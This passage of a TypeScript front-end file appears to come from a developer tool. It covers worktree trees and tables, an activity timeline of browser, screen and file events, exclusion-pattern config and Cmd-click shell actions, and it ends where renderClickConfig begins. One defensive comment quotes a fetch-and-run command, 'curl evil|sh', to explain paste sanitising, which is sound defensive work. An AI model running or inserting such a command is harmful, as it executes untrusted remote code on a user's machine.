// A trailing row action: a small button on the right edge of a tree row. The
// `menu` variant opens a context menu anchored to the button (the AI picker).
type RowAction = {
  label: string;
  title: string;
  cls?: string;
  onClick: (anchor: HTMLElement) => void;
};

function treeNode(opts: {
  depth: number;
  glyph: "+" | "-" | "";
  label: string;
  meta?: string;
  multi?: boolean;
  dirty?: boolean;
  // A leading ☆/★ toggle (worktree leaves only). `on` drives the filled glyph.
  star?: { on: boolean; onToggle: () => void };
  // Full filepath shown dim after the meta (worktree leaves), title on hover.
  path?: string;
  onGlyph?: () => void;
  onLabel?: (e: MouseEvent) => void;
  onDblClick?: (e: MouseEvent) => void;
  onContextMenu?: (e: MouseEvent) => void;
  actions?: RowAction[];
  // Inline editor shown in place of the meta (e.g. the new-worktree branch
  // input). When present the row renders an <input> and forwards submit/cancel.
  editor?: { placeholder: string; onSubmit: (value: string) => void; onCancel: () => void };
}): HTMLElement {
  const row = document.createElement("div");
  row.className = "wt-node" + (opts.multi ? " multi" : "");
  row.style.paddingLeft = `${6 + opts.depth * 16}px`;

  const g = document.createElement("span");
  g.className = "wt-glyph";
  g.textContent = opts.glyph;
  if (opts.onGlyph)
    g.onclick = (e) => {
      e.stopPropagation();
      opts.onGlyph!();
    };
  row.appendChild(g);

  if (opts.star) {
    const star = document.createElement("span");
    star.className = "wt-star" + (opts.star.on ? " on" : "");
    star.textContent = opts.star.on ? "★" : "☆";
    star.title = opts.star.on ? "unfavorite" : "favorite";
    star.onclick = (e) => {
      e.stopPropagation();
      opts.star!.onToggle();
    };
    row.appendChild(star);
  }

  const label = document.createElement("span");
  label.className = "wt-label";
  label.textContent = opts.label;
  row.appendChild(label);

  if (opts.meta) {
    const m = document.createElement("span");
    m.className = "wt-meta";
    m.textContent = opts.meta;
    row.appendChild(m);
  }
  if (opts.dirty) {
    const d = document.createElement("span");
    d.className = "wt-dirty";
    d.textContent = "●";
    row.appendChild(d);
  }
  if (opts.path) {
    const p = document.createElement("span");
    p.className = "wt-path";
    p.textContent = tildify(opts.path);
    p.title = opts.path;
    row.appendChild(p);
  }

  if (opts.editor) {
    const inp = document.createElement("input");
    inp.className = "wt-add-input";
    inp.placeholder = opts.editor.placeholder;
    inp.onclick = (e) => e.stopPropagation();
    inp.onkeydown = (e) => {
      if (e.key === "Enter") opts.editor!.onSubmit(inp.value.trim());
      else if (e.key === "Escape") opts.editor!.onCancel();
    };
    row.appendChild(inp);
    queueMicrotask(() => inp.focus());
  }

  if (opts.actions?.length) {
    const acts = document.createElement("span");
    acts.className = "wt-actions";
    for (const a of opts.actions) {
      const b = document.createElement("button");
      b.className = "wt-act" + (a.cls ? ` ${a.cls}` : "");
      b.textContent = a.label;
      b.title = a.title;
      b.onclick = (e) => {
        e.stopPropagation();
        a.onClick(b);
      };
      acts.appendChild(b);
    }
    row.appendChild(acts);
  }

  if (opts.onLabel) row.onclick = (e) => opts.onLabel!(e);
  if (opts.onDblClick) row.ondblclick = (e) => opts.onDblClick!(e);
  if (opts.onContextMenu)
    row.oncontextmenu = (e) => {
      e.preventDefault();
      e.stopPropagation();
      opts.onContextMenu!(e);
    };
  return row;
}

// "/Users/me/projects/x" -> "~/projects/x" for compact display. Home is filled
// once at boot (see init) so this stays synchronous for render.
let homeDirCached = "";
function tildify(p: string): string {
  const h = homeDirCached.replace(/\/$/, "");
  return h && p.startsWith(h + "/") ? "~" + p.slice(h.length) : p;
}

function renderTree(rows: WorktreeRow[]) {
  const host = $("#wt-table");
  host.innerHTML = "";
  const wtExpanded = new Set(store.get().wtExpanded);
  const toggle = (key: string) => {
    const next = new Set(wtExpanded);
    next.has(key) ? next.delete(key) : next.add(key);
    store.set({ wtExpanded: [...next] }); // persists + re-renders via subscription
  };

  const wrap = document.createElement("div");
  wrap.className = "wt-tree";
  for (const org of buildTree(focusRows(rows))) {
    const okey = `o:${org.origin}`;
    const oOpen = wtExpanded.has(okey);
    wrap.appendChild(
      treeNode({
        depth: 0,
        glyph: oOpen ? "-" : "+",
        label: prettyOrigin(org.origin),
        meta: `${org.clones.length} clone${org.clones.length > 1 ? "s" : ""}`,
        multi: org.clones.length > 1,
        onGlyph: () => toggle(okey),
        onLabel: () => toggle(okey),
      }),
    );
    if (!oOpen) continue;

    for (const cl of org.clones) {
      const ckey = `${okey}|c:${cl.clone}`;
      const cOpen = wtExpanded.has(ckey);
      const adding = store.get().wtAddingClone === cl.clone;
      wrap.appendChild(
        treeNode({
          depth: 1,
          glyph: cl.worktrees.length ? (cOpen ? "-" : "+") : "",
          label: baseName(cl.clone),
          meta: adding ? undefined : cl.branch ? `@${cl.branch}` : "",
          onGlyph: cl.worktrees.length ? () => toggle(ckey) : undefined,
          onLabel: cl.worktrees.length && !adding ? () => toggle(ckey) : undefined,
          // "+ worktree": reveal an inline branch input on this checkout row.
          actions: adding
            ? undefined
            : [
                {
                  label: "+ worktree",
                  title: "add a git worktree under this checkout",
                  cls: "wt-add",
                  onClick: () => {
                    store.set({ wtAddingClone: cl.clone });
                    if (!cOpen) toggle(ckey); // expand so the new row is visible
                    else renderWorktreesPanel();
                  },
                },
              ],
          editor: adding
            ? {
                placeholder: "branch name…",
                onSubmit: (v) => submitAddWorktree(cl.clone, v),
                onCancel: () => {
                  store.set({ wtAddingClone: null });
                },
              }
            : undefined,
        }),
      );
      if (!cOpen) continue;

      for (const wt of cl.worktrees) {
        const live = sessionsForWorktree(wt.worktree);
        const g = leafGestures(cl.clone, wt.branch, wt.worktree, wt.dirty);
        const actions: RowAction[] = [
          {
            label: "open ▾",
            title: "open a NEW session here (pick an agent)",
            cls: "wt-open",
            onClick: (anchor) => {
              const r = anchor.getBoundingClientRect();
              showAgentMenu(r.left, r.bottom, cl.clone, wt.branch, wt.worktree, wt.dirty);
            },
          },
        ];
        if (live.length)
          actions.push({
            label: `resume${live.length > 1 ? ` (${live.length})` : ""}`,
            title: `attach existing session: ${live.map((s) => s.name).join(", ")}`,
            cls: "wt-resume",
            onClick: () => openTab(live[0].name),
          });
        wrap.appendChild(
          treeNode({
            depth: 2,
            glyph: "",
            label: wt.is_main ? "(main)" : baseName(wt.worktree),
            meta: `${wt.branch}  ${wt.head}`,
            dirty: wt.dirty,
            path: wt.worktree,
            star: { on: isFavWorktree(wt.worktree), onToggle: () => toggleFavWorktree(wt.worktree) },
            actions,
            // single = resume/pick · double = new session · right = picker
            onDblClick: () => g.onDouble(),
            onContextMenu: (e) => g.onContext(e.clientX, e.clientY),
            onLabel: (e) => g.onSingle(e.clientX, e.clientY),
          }),
        );
      }
    }
  }
  host.appendChild(wrap);
}

// Per-dtable sort state lives in store.tableSort keyed by a table id, so it
// survives the panel re-renders that selection/refresh trigger.
function tableSortFor(id: string, fallback: SortState): SortState {
  return store.get().tableSort[id] ?? fallback;
}
function onTableSort(id: string, s: SortState, rerender: () => void) {
  store.set({ tableSort: { ...store.get().tableSort, [id]: s } });
  rerender();
}

function renderFlatTable(rows: WorktreeRow[]) {
  const host = $("#wt-table");
  host.innerHTML = "";
  const sort = tableSortFor("worktrees", { col: 0, dir: "asc" });
  const gFor = (r: WorktreeRow) => leafGestures(r.clone, r.branch, r.worktree, r.dirty);
  host.appendChild(
    renderTable<WorktreeRow>({
      rows: focusRows(rows),
      sort,
      onSort: (s) => onTableSort("worktrees", s, () => renderFlatTable(store.get().worktrees)),
      columns: [
        {
          // Star indicator; toggle via right-click (favorite/unfavorite).
          header: "",
          cell: (r) => (isFavWorktree(r.worktree) ? "★" : "☆"),
          cellClass: (r) => (isFavWorktree(r.worktree) ? "wt-star on" : "wt-star"),
          sortKey: (r) => (isFavWorktree(r.worktree) ? 0 : 1),
        },
        { header: "org/repo", cell: (r) => prettyOrigin(r.origin), sortKey: (r) => r.origin },
        { header: "clone", cell: (r) => baseName(r.clone), sortKey: (r) => baseName(r.clone) },
        {
          header: "worktree",
          cell: (r) => (r.is_main ? "(main)" : baseName(r.worktree)),
          sortKey: (r) => (r.is_main ? "" : baseName(r.worktree)),
        },
        { header: "branch", cell: (r) => r.branch, sortKey: (r) => r.branch },
        { header: "head", cell: (r) => r.head, sortKey: (r) => r.head },
        { header: "path", cell: (r) => tildify(r.worktree), sortKey: (r) => r.worktree },
        {
          header: "",
          cell: (r) => (r.dirty ? "●" : ""),
          cellClass: (r) => (r.dirty ? "wt-dirty" : undefined),
          sortKey: (r) => (r.dirty ? 0 : 1), // dirty rows first on asc
        },
      ],
      rowTitle: (r) => r.worktree,
      // Same gesture model as the tree: single=resume/pick, dbl=new, right=menu.
      onRow: (r, e) => gFor(r).onSingle(e.clientX, e.clientY),
      onRowDblClick: (r) => gFor(r).onDouble(),
      onRowContextMenu: (r, e) => gFor(r).onContext(e.clientX, e.clientY),
    }),
  );
}

function renderWorktreesPanel() {
  // Panel may be closed / mid-remount when a store change fires this; bail.
  const count = document.querySelector<HTMLElement>("#wt-count");
  if (!count) return;
  const { worktrees, wtView, wtFocus, wtFavorites } = store.get();
  const shown = wtFocus ? worktrees.filter((r) => wtFavorites.includes(r.worktree)).length : worktrees.length;
  count.textContent = worktrees.length
    ? wtFocus
      ? `${shown}/${worktrees.length} ★`
      : `${worktrees.length} worktrees`
    : "";
  ($("#wt-view") as HTMLButtonElement).textContent =
    wtView === "tree" ? "Table" : "Tree";
  const focusBtn = document.querySelector<HTMLButtonElement>("#wt-focus");
  if (focusBtn) {
    focusBtn.textContent = wtFocus ? "★ Focus" : "☆ Focus";
    focusBtn.classList.toggle("on", wtFocus);
  }
  renderWtAgentsEditor();
  if (wtView === "tree") renderTree(worktrees);
  else renderFlatTable(worktrees);
}

async function scanWorktrees() {
  // Read from the panel input when it's mounted, else fall back to the persisted
  // root: onPanelShown can fire this before the worktrees DOM is queryable.
  const input = document.querySelector<HTMLInputElement>("#wt-root");
  const root = (input?.value ?? store.get().scanRoot).trim();
  store.set({ scanRoot: root }); // remember it
  const setCount = (s: string) => {
    const c = document.querySelector<HTMLElement>("#wt-count");
    if (c) c.textContent = s;
  };
  setCount("scanning…");
  try {
    const rows = await invoke<WorktreeRow[]>("scan_worktrees", {
      roots: root ? [root] : [],
      maxDepth: null,
    });
    store.set({ worktrees: rows });
  } catch (e) {
    console.error("scan_worktrees:", e);
    setCount("scan failed");
  }
}

// ---- activity: unified timeline of browser + os-capture + file events ----
const ACTIVITY_CAP = 2000;
const prettyUrl = (u: string) =>
  u.replace(/^https?:\/\//, "").replace(/^www\./, "");
function fmtTime(ts: number): string {
  const d = new Date(ts);
  const p = (n: number) => String(n).padStart(2, "0");
  return `${p(d.getHours())}:${p(d.getMinutes())}:${p(d.getSeconds())}`;
}

// Drop text into the active terminal (a row's text/url paste target).
// Strip C0 control chars + DEL (newlines, carriage returns, ESC) from text
// before it lands in a pty at the prompt. Activity rows (text/url/title arrive
// unauthenticated over the ingest server) flow through here on double-click; an
// embedded "\ncurl evil|sh\n" would otherwise auto-run on one click, and raw
// ESC could inject terminal escape sequences. Legit payloads (file paths,
// selections) carry no control chars, so this is a no-op for them.
function sanitizePaste(data: string): string {
  // eslint-disable-next-line no-control-regex
  return data.replace(/[\x00-\x1f\x7f]+/g, " ");
}

function pasteToActive(data: string) {
  const id = activeId();
  if (!id || !data) return;
  invoke("write_pty", { id, data: sanitizePaste(data) }).catch(console.error);
  tabs.get(id)?.term.focus();
}

// Where a row came from, for the source column: os captures show the frontmost
// app, browser rows the page title/host, file rows the file name.
function eventSource(e: Event): string {
  if (e.source === "os") return e.app || "screen";
  if (e.source === "files") return e.title || "file";
  return e.title || prettyUrl(e.url);
}
// The free-text payload fuzzy search runs over (and the search-key for a row).
function eventText(e: Event): string {
  return e.text || e.url || e.title;
}
function activityKey(e: Event): string {
  return `${e.kind} ${e.source} ${eventSource(e)} ${eventText(e)}`;
}

// Short source label for the row (the panel's one filter axis is source).
const SRC_LABEL: Record<Event["source"], string> = {
  os: "screen",
  browser: "web",
  files: "file",
  session: "session",
};
// Normalize the raw kind grab-bag into a small set of verbs for the row.
const ACTION_VERB: Record<string, string> = {
  nav: "visit",
  tabopen: "tab",
  tabclose: "tab",
  dblclick: "click",
  ctrlclick: "click",
  selection: "select",
  clipboard: "copy",
};
const actionVerb = (e: Event): string => ACTION_VERB[e.kind] ?? e.kind;

// The visible rows: source chip, then fuzzy search box.
function visibleActivity(): Event[] {
  const { activity, activitySource, activityQuery } = store.get();
  const filtered = activity.filter(
    (e) => activitySource === "all" || e.source === activitySource,
  );
  return fuzzyFilter(activityQuery, filtered, activityKey);
}

// Display-ready timeline rows for ActivityPanelV2. `title` mirrors v1's <tr
// title> (shot path wins, used by the global ctx-menu); `paste` is the
// dbl-click payload (text/url/title, never the shot path).
function actRows(): ActRow[] {
  return visibleActivity().map((e) => ({
    id: e.id,
    ts: e.ts,
    time: fmtTime(e.ts),
    source: e.source,
    src: SRC_LABEL[e.source],
    action: actionVerb(e),
    target: eventSource(e),
    title: e.shot || e.url || e.text || e.title,
    paste: eventText(e),
    kind: e.kind,
    // The previewable file path for this row, if any: a screenshot PNG (os) or
    // the logged file path (files). Routed to a split-right preview tab.
    filePath: e.shot || (e.source === "files" ? e.text : "") || undefined,
    shot: e.shot || undefined,
    url: e.url || undefined,
    text: e.text || undefined,
  }));
}

// Wire the ActivityPanelV2 bridge: derivation + handlers here, presentation in
// tablepanels.tsx. The panel re-renders on store change (useApp), so the
// record/chips/search state stays in the store, no DOM sync needed.
function registerActivityBridge() {
  setActivityPanel({
    rows: actRows,
    count: () => ({
      shown: visibleActivity().length,
      total: store.get().activity.length,
    }),
    source: () => store.get().activitySource,
    setSource: (s) => store.set({ activitySource: s as ActivitySource }),
    query: () => store.get().activityQuery,
    setQuery: (q) => store.set({ activityQuery: q }),
    recording: () => store.get().captureEnabled,
    toggleRecord: () => toggleRecording(),
    clear: () =>
      invoke("activity_clear")
        .then(() => store.set({ activity: [] }))
        .catch(console.error),
    hasEvents: () => store.get().activity.length > 0,
    onActivate: (r) => {
      if (r.paste) pasteToActive(r.paste + " ");
    },
    // Any file-backed row (screenshot PNG or logged file) opens the shared
    // file-preview in a split-right tab.
    openPreview: (path) => openPreviewPanel(path, undefined, "right"),
    perms: () => store.get().capturePerms,
    status: () => store.get().captureStatus,
    refreshPerms: refreshCapturePerms,
    requestScreen: () => {
      invoke("capture_request_screen")
        // The grant may not register until the OS prompt is dismissed; re-probe
        // shortly after so the banner clears once it's granted.
        .then(() => setTimeout(refreshCapturePerms, 500))
        .catch(console.error);
    },
    onShow: () => {
      if (store.get().activity.length === 0) refreshActivity();
      refreshCapturePerms();
    },
  });
}

// Probe macOS TCC + tap state for the Activity panel's capture banner.
function refreshCapturePerms() {
  invoke<CapturePerms>("capture_permissions")
    .then((p) => store.set({ capturePerms: p }))
    .catch(console.error);
}

// Load all sources once; the chip + search filter client-side (visibleActivity).
async function refreshActivity() {
  try {
    store.set({
      activity: await invoke<Event[]>("activity_events", {
        limit: ACTIVITY_CAP,
        source: null,
      }),
    });
  } catch (e) {
    console.error("activity_events:", e);
  }
}

// ---- config: observation filters (config.json), editable readout ----
async function refreshConfig() {
  try {
    store.set({ config: await invoke<ConfigView>("config_get") });
  } catch (e) {
    console.error("config_get:", e);
  }
}

// Persist a full set of rule lists and refresh the view from the backend.
async function applyConfig(sites: string[], files: string[], apps: string[]) {
  try {
    const view = await invoke<ConfigView>("config_set", {
      excludeSites: sites,
      excludeFiles: files,
      excludeApps: apps,
    });
    store.set({ config: view });
  } catch (e) {
    console.error("config_set:", e);
  }
}

// One editable rule group: removable chips + an add input. onChange gets the
// full next list for this group.
// Options section for the Config panel: every config toggle declared by a
// plugin (see plugin.tsx configOptions). Returns null when none are declared.
// Reuses .cfg-group chrome so it sits with the rest.
function optionsGroup(): HTMLElement | null {
  const opts = configOptions();
  if (!opts.length) return null;
  const sec = document.createElement("div");
  sec.className = "cfg-group";
  const h = document.createElement("div");
  h.className = "cfg-group-head";
  h.innerHTML = `<b>Options</b> <span class="muted">appearance &amp; behavior</span>`;
  sec.appendChild(h);

  // xp.css draws its pixel checkbox only for the `input + label[for]` sibling
  // pattern (it sets the raw input to opacity:0/position:fixed). So emit that
  // exact structure, not a wrapping label, or the box never renders.
  for (const o of opts) {
    const row = document.createElement("div");
    row.className = "cfg-toggle";
    const cb = document.createElement("input");
    cb.type = "checkbox";
    cb.id = `cfgopt-${o.id}`;
    cb.checked = o.get();
    cb.addEventListener("change", () => o.set(cb.checked));
    const lab = document.createElement("label");
    lab.htmlFor = cb.id;
    lab.innerHTML = `${escapeHtml(o.label)} <span class="muted">${escapeHtml(o.hint ?? "")}</span>`;
    row.append(cb, lab);
    sec.appendChild(row);
  }
  return sec;
}

function cfgGroup(
  title: string,
  hint: string,
  items: string[],
  onChange: (next: string[]) => void,
): HTMLElement {
  const sec = document.createElement("div");
  sec.className = "cfg-group";
  const h = document.createElement("div");
  h.className = "cfg-group-head";
  h.innerHTML = `<b>${title}</b> <span class="muted">${hint}</span>`;
  sec.appendChild(h);

  const list = document.createElement("div");
  list.className = "cfg-chips";
  items.forEach((pat, i) => {
    const chip = document.createElement("span");
    chip.className = "cfg-chip";
    chip.textContent = pat;
    const x = document.createElement("span");
    x.className = "cfg-x";
    x.textContent = "×";
    x.onclick = () => onChange(items.filter((_, j) => j !== i));
    chip.appendChild(x);
    list.appendChild(chip);
  });
  sec.appendChild(list);

  const form = document.createElement("form");
  form.className = "cfg-add";
  const input = document.createElement("input");
  input.placeholder = "add pattern…";
  input.autocomplete = "off";
  const add = document.createElement("button");
  add.type = "submit";
  add.textContent = "+";
  form.appendChild(input);
  form.appendChild(add);
  form.onsubmit = (e) => {
    e.preventDefault();
    const v = input.value.trim();
    if (v && !items.includes(v)) onChange([...items, v]);
    input.value = "";
  };
  sec.appendChild(form);
  return sec;
}

function renderConfigPanel() {
  const meta = document.querySelector<HTMLElement>("#config-meta");
  const body = document.querySelector<HTMLElement>("#config-body");
  if (!meta || !body) return; // panel detached; a later show re-renders
  const cfg = store.get().config;
  if (!cfg) {
    meta.textContent = "";
    body.innerHTML = `<div class="empty-help">loading…</div>`;
    return;
  }
  meta.textContent =
    `${cfg.source}` + (cfg.excluded_count ? ` · ${cfg.excluded_count} blocked` : "");
  body.innerHTML = "";

  const head = document.createElement("div");
  head.className = "cfg-status";
  const errLine = cfg.error
    ? `<div class="cfg-err">⚠ ${escapeHtml(cfg.error)} — using defaults</div>`
    : "";
  head.innerHTML = `
    <div>loaded from <b>${escapeHtml(cfg.source)}</b></div>
    <code>${escapeHtml(cfg.path)}</code>
    ${errLine}
    <div class="muted">${cfg.excluded_count} events blocked since launch ·
      patterns are case-insensitive; <code>*</code> is a wildcard</div>`;

  const opts = optionsGroup(); // plugin-declared toggles, up top
  if (opts) body.appendChild(opts);
  body.appendChild(head);

  body.appendChild(
    cfgGroup(
      "Sites",
      "browser URLs to ignore (e.g. mail.google.com, *.bank.com)",
      cfg.exclude_sites,
      (next) => applyConfig(next, cfg.exclude_files, cfg.exclude_apps),
    ),
  );
  body.appendChild(
    cfgGroup(
      "Files",
      "file paths to ignore (e.g. /secret/, *.env)",
      cfg.exclude_files,
      (next) => applyConfig(cfg.exclude_sites, next, cfg.exclude_apps),
    ),
  );
  body.appendChild(
    cfgGroup(
      "Apps",
      "never screenshot while these apps are frontmost (e.g. 1Password)",
      cfg.exclude_apps,
      (next) => applyConfig(cfg.exclude_sites, cfg.exclude_files, next),
    ),
  );
}

// ---- files: a Windows-Explorer-style filesystem browser + media preview ----
const IMAGE_EXTS = new Set([
  "png", "jpg", "jpeg", "gif", "webp", "bmp", "svg", "ico", "avif",
]);

// Glyph for a filesystem row in the unified tree (folder / image / file).
function fileGlyph(e: FsEntry): string {
  if (e.is_dir) return "📁";
  if (IMAGE_EXTS.has(e.ext)) return "🖼";
  return "📄";
}

// Record a file reference in the unified activity store (source='files').
function logFileOpen(e: FsEntry) {
  invoke("activity_log", {
    source: "files",
    kind: "open",
    title: e.name,
    text: e.path,
  }).catch(console.error);
}

// Lazily load one folder's children the first time it's expanded; no-op if the
// listing is already cached. The new listing is merged into fsChildren (a fresh
// ref) so the unified tree re-renders with the subrows present.
async function loadFsChildren(path: string) {
  if (store.get().fsChildren[path]) return;
  try {
    const listing = await invoke<DirListing>("list_dir", { path });
    store.set({ fsChildren: { ...store.get().fsChildren, [path]: listing.entries } });
  } catch (e) {
    console.error("list_dir:", e);
  }
}

// File extension -> shiki language id. Anything not listed falls back to plain
// text (shiki still renders it, just unhighlighted).
const MD_EXTS = new Set(["md", "markdown", "mdx"]);
const SHIKI_LANG: Record<string, string> = {
  ts: "typescript", tsx: "tsx", mts: "typescript", cts: "typescript",
  js: "javascript", jsx: "jsx", mjs: "javascript", cjs: "javascript",
  json: "json", jsonc: "json", css: "css", scss: "scss", less: "less",
  html: "html", xml: "xml", svg: "xml", vue: "vue", svelte: "svelte",
  rs: "rust", py: "python", rb: "ruby", go: "go", php: "php", java: "java",
  kt: "kotlin", swift: "swift", c: "c", h: "c", cpp: "cpp", hpp: "cpp",
  cc: "cpp", cs: "csharp", sh: "bash", bash: "bash", zsh: "bash",
  yml: "yaml", yaml: "yaml", toml: "toml", sql: "sql", lua: "lua",
  dockerfile: "docker", makefile: "makefile",
};

const escapeHtml = (s: string) =>
  s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");

// ---- ⌘-click action table ----
// A ⌘-click on a terminal token runs the first clickRules rule whose regex
// matches it (see DEFAULT_CLICK_RULES). The token is shell-quoted into `$1`, the
// command runs in the pane cwd via run_click, and any stdout opens a panel on
// the right (rg results); launchers (open/code) print nothing, so they just run.

// Single-quote a token for /bin/sh so the clicked text can't inject shell.
const shQuote = (s: string) => `'${s.replace(/'/g, `'\\''`)}'`;

const clickRules = (): ClickRule[] => store.get().clickRules ?? DEFAULT_CLICK_RULES;

async function dispatchClick(rawToken: string, cwd: string) {
  const token = rawToken.trim();
  if (!token) return;
  const rule = clickRules().find((r) => {
    try {
      return new RegExp(r.pattern).test(token);
    } catch {
      return false; // a bad regex in the table just doesn't match
    }
  });
  if (!rule) return;
  const command = rule.command.replace(/\$1/g, () => shQuote(token));
  let out = "";
  try {
    out = await invoke<string>("run_click", { command, cwd });
  } catch (e) {
    out = String(e);
  }
  if (out.trim()) openClickPanel(token, out, cwd, rule);
}

// cwd to search from when a ⌘-click happens outside a terminal: the focused
// terminal tab's cwd (best proxy for "where am I"), else empty (run_click falls
// back to HOME).
const activeCwd = (): string =>
  focusedTermId ? tabMetaById(focusedTermId)?.cwd ?? "" : "";

// The word under a viewport point in DOM text (preview / rg panels). Mirrors the
// terminal's wordAt: expands to whitespace, trimming the wrapping punctuation the
// clickRules grep would choke on otherwise.
function domWordAt(x: number, y: number): string {
  const range = document.caretRangeFromPoint?.(x, y);
  const node = range?.startContainer;
  if (!range || !node || node.nodeType !== Node.TEXT_NODE) return "";
  const text = node.nodeValue ?? "";
  const quoted = quotedSpanAt(text, range.startOffset);
  if (quoted) return quoted;
  const isWord = (c: string | undefined) => !!c && /\S/.test(c) && !/['"<>(){}\[\],;:]/.test(c);
  let a = range.startOffset;
  let b = range.startOffset;
  while (a > 0 && isWord(text[a - 1])) a--;
  while (b < text.length && isWord(text[b])) b++;
  return text.slice(a, b).trim();
}

// ⌘-click on free text inside a preview / rg panel runs the same clickRules
// search as the terminal. Capture phase, so it beats the panels' own click
// handlers; interactive bits (back, config link, hit rows, buttons) are skipped
// so their own actions still fire on ⌘-click.
function wireDomCmdClick() {
  document.addEventListener(
    "mousedown",
    (e) => {
      if (!e.metaKey || e.button !== 0) return;
      const t = e.target as HTMLElement;
      if (t.closest(".term-host") || t.closest(".xterm")) return; // terminals self-handle
      if (!t.closest(".fs-preview, .rg-panel")) return;
      if (t.closest(".fs-back, .rg-cfg, .rg-file, .rg-hit, a, button")) return;
      const sel = window.getSelection()?.toString().trim() ?? "";
      const word = sel || domWordAt(e.clientX, e.clientY);
      if (!word) return;
      e.preventDefault();
      e.stopPropagation();
      void dispatchClick(word, activeCwd());
    },
    { capture: true },
  );
}

const clickPanelEls = new Map<string, HTMLElement>();

// Adopt a per-query results node into a right-side panel (same plumbing as file
// previews). Re-running the same query refreshes the existing panel.
function openClickPanel(query: string, output: string, cwd: string, rule: ClickRule) {
  const key = `rg:${query}`;
  let el = clickPanelEls.get(key);
  if (!el) {
    el = document.createElement("div");
    el.className = "rg-panel";
    clickPanelEls.set(key, el);
  }
  renderClickOutput(el, query, output, cwd, rule);
  addPreviewPanel(key, query, el, "right");
}

// Render command stdout grouped like ripgrep's heading view: one file header per
// path, then its `line  text` hits. Lines shaped `path:line:text` (rg -n piped)
// parse into hits that open the file preview at that line; anything else falls
// back to a plain row.
type RgHit = { line: number; text: string };
type RgGroup = { path: string; hits: RgHit[] };

function renderClickOutput(el: HTMLElement, query: string, output: string, cwd: string, rule: ClickRule) {
  const base = cwd.replace(/\/$/, "");
  const resolve = (p: string) => (p.startsWith("/") || p.startsWith("~") ? p : base ? `${base}/${p}` : p);
  const lines = output.replace(/\n+$/, "").split("\n");

  const groups: RgGroup[] = [];
  const plain: string[] = [];
  for (const l of lines) {
    const m = l.match(/^(.+?):(\d+):(.*)$/);
    if (!m) {
      if (l) plain.push(l);
      continue;
    }
    const [, p, ln, rest] = m;
    const g = groups[groups.length - 1];
    if (g && g.path === p) g.hits.push({ line: +ln, text: rest });
    else groups.push({ path: p, hits: [{ line: +ln, text: rest }] });
  }

  const hitCount = groups.reduce((n, g) => n + g.hits.length, 0);
  const fileRow = (p: string) =>
    `<div class="rg-file" data-path="${escapeHtml(p)}">${escapeHtml(p)}</div>`;
  const hitRow = (p: string, h: RgHit) =>
    `<div class="rg-hit" data-path="${escapeHtml(p)}" data-line="${h.line}">` +
    `<span class="rg-ln">${h.line}</span><span class="rg-tx">${escapeHtml(h.text) || " "}</span></div>`;

  const body =
    groups
      .map((g) => `<div class="rg-group">${fileRow(g.path)}${g.hits.map((h) => hitRow(g.path, h)).join("")}</div>`)
      .join("") + plain.map((l) => `<div class="rg-plain">${escapeHtml(l)}</div>`).join("");

  el.innerHTML =
    `<div class="rg-head">${escapeHtml(query)}` +
    (hitCount
      ? ` <span class="rg-count">${hitCount} match${hitCount === 1 ? "" : "es"} · ${groups.length} file${groups.length === 1 ? "" : "s"}</span>`
      : "") +
    `</div>` +
    `<div class="rg-sub">ran <code>${escapeHtml(rule.command)}</code> · ` +
    `<a class="rg-cfg" href="#">config</a></div>` +
    `<div class="rg-body">${body || '<div class="rg-plain">no matches</div>'}</div>`;

  el.querySelector<HTMLElement>(".rg-cfg")?.addEventListener("click", (e) => {
    e.preventDefault();
    openClickConfigPanel();
  });
  el.querySelectorAll<HTMLElement>(".rg-body [data-path]").forEach((node) =>
    node.addEventListener("click", () => {
      const p = node.getAttribute("data-path") ?? "";
      const ln = Number(node.getAttribute("data-line") ?? "0");
      if (!p) return;
      const full = resolve(p);
      previewOrigin.set(full, `rg:${query}`); // record before render so "← back" shows
      openPreviewPanel(full, ln > 0 ? ln : undefined);
    }),
  );

  // Highlight the matched token. NB: no shiki syntax-coloring on hit rows — it
  // splits a row into per-token spans, so a multi-token / punctuated query (e.g.
  // "markTokenInNode(root") spans several text nodes and the per-node search finds
  // nothing. Plain text keeps each row as one text node, so the match (punctuation
  // and all) is always found and wrapped.
  markClickMatches(el, query);
}

// Wrap each occurrence of the searched token inside the hit rows with a
// translucent highlighter, superscripted with its 1-based global index — so the
// "N matches" count is visible at a glance (you can find all N, not just the
// files). Operates on text nodes, so it works whether or not shiki colored the
// row, and a match nested inside a colored span is still wrapped.
function markClickMatches(el: HTMLElement, query: string) {
  const q = query.trim();
  if (!q) return;
  const txs = Array.from(el.querySelectorAll<HTMLElement>(".rg-tx"));
  if (txs.length === 0 || txs.length > 1000) return; // keep huge result sets snappy
  const lc = q.toLowerCase();
  let idx = 0;
  for (const tx of txs) {
    // Unwrap any prior marks first so re-runs (e.g. after shiki recolors a row)
    // re-index cleanly instead of nesting <mark> inside <mark>. The match text is
    // the mark's first child; the <sup> badge is dropped.
    tx.querySelectorAll<HTMLElement>(".rg-mark").forEach((m) => {
      m.replaceWith(document.createTextNode(m.childNodes[0]?.nodeValue ?? ""));
    });
    tx.normalize();
    idx = markTokenInNode(tx, lc, q.length, idx);
  }
}

function markTokenInNode(root: HTMLElement, lc: string, len: number, startIdx: number): number {
  let idx = startIdx;
  const walker = document.createTreeWalker(root, NodeFilter.SHOW_TEXT);
  const textNodes: Text[] = [];
  for (let n = walker.nextNode(); n; n = walker.nextNode()) textNodes.push(n as Text);
  for (const tn of textNodes) {
    const text = tn.nodeValue ?? "";
    const hay = text.toLowerCase();
    if (!hay.includes(lc)) continue;
    const frag = document.createDocumentFragment();
    let last = 0;
    for (let pos = hay.indexOf(lc); pos >= 0; pos = hay.indexOf(lc, last)) {
      if (pos > last) frag.appendChild(document.createTextNode(text.slice(last, pos)));
      const mark = document.createElement("mark");
      mark.className = "rg-mark";
      mark.textContent = text.slice(pos, pos + len);
      idx += 1;
      const badge = document.createElement("span");
      badge.className = "rg-idx";
      badge.textContent = String(idx);
      mark.appendChild(badge);
      frag.appendChild(mark);
      last = pos + len;
    }
    if (last < text.length) frag.appendChild(document.createTextNode(text.slice(last)));
    tn.parentNode?.replaceChild(frag, tn);
  }
  return idx;
}

// The ⌘-click action table, editable in-app. This is our "internal routing": the
// `config` link in a results panel calls straight into this — no URL scheme, just
// open the editor panel. Edits persist to the store (and thus localStorage).
function openClickConfigPanel() {
  const key = "config:clickRules";
  let el = clickPanelEls.get(key);
  if (!el) {
    el = document.createElement("div");
    el.className = "rg-panel";
    clickPanelEls.set(key, el);
  }
  renderClickConfig(el);
  addPreviewPanel(key, "click rules", el, "right");
}

function renderClickConfig(el: HTMLElement) {
